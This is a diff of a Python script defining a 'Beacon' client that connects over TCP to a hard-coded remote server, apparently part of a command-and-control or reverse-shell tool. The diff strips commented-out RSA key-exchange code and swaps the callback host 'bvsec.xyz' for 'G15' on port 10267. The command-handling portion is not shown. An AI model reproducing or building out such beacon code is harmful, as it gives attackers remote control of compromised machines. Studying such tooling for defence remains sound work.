@@ -1,7 +1,6 @@
 #!/usr/bin/python3
 
 import socket,subprocess,time,string
-#import rsa
 
 class Beacon:
    #Contains client side behavior and state
@@ -13,15 +12,11 @@ class Beacon:
       self.server_ip = server_ip
       self.server_port = server_port
       self.debugging = True
-      #self.pubkey,self.privatekey = rsa.newkeys(2048)
-      #print(self.pubkey,self.privatekey)
 
    def connect(self):
       try:
          self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          self.sock.connect((self.server_ip,self.server_port))
-         #pubkey_pem = self.pubkey.save_pkcs1(format='PEM')
-         #self.sock.sendall(pubkey_pem)
       except:
          self.sock.close()
 
@@ -79,7 +74,7 @@ class Beacon:
          self.sock.close()
 
 def main():
-   beacon = Beacon("bvsec.xyz",10267)
+   beacon = Beacon("G15",10267)
    beacon.start()
 
 main()
